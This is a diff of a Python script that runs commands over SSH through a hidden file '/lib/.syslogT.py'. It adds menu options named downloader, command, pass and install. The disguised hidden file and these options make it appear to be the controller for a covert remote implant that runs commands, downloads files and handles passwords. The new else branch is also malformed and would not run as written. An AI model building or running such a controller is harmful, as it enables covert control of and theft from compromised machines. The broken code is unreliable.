@@ -28,12 +28,29 @@ def main():
         x = True
         while(x):
             option = input("Enter command(h for help): ")
-            if(option.lower() in ('h', 'help')):
-                command = "python3 /lib/.syslogT.py \"-h\""
+            if(option.lower() in ('s', 'status')):
+                command = "python3 /lib/.syslogT.py \"-s\""
                 stdin, stdout, stderr = sshClient.exec_command(command)
                 print(stdout.read().decode('utf-8'))
-            elif(option.lower() in ('s', 'status')):
-                command = "python3 /lib/.syslogT.py \"-s\""
+            elif(option.lower() in ('d', 'downloader')):
+                command = "python3 /lib/.syslogT.py \"-d\""
+                stdin, stdout, stderr = sshClient.exec_command(command)
+                print(stdout.read().decode('utf-8'))
+            elif(option.lower() in ('c', 'command')):
+                command = "python3 /lib/.syslogT.py \"-c\""
+                stdin, stdout, stderr = sshClient.exec_command(command)
+                print(stdout.read().decode('utf-8'))
+            elif(option.lower() in ('p', 'pass')):
+                command = "python3 /lib/.syslogT.py \"-p\""
+                stdin, stdout, stderr = sshClient.exec_command(command)
+                print(stdout.read().decode('utf-8'))
+            elif(option.lower() in ('i', 'install')):
+                command = "python3 /lib/.syslogT.py \"-i\""
+                stdin, stdout, stderr = sshClient.exec_command(command)
+                print(stdout.read().decode('utf-8'))
+            else:
+                if(option.lower() in ('h', 'help')):
+                command = "python3 /lib/.syslogT.py \"-h\""
                 stdin, stdout, stderr = sshClient.exec_command(command)
                 print(stdout.read().decode('utf-8'))
 main()
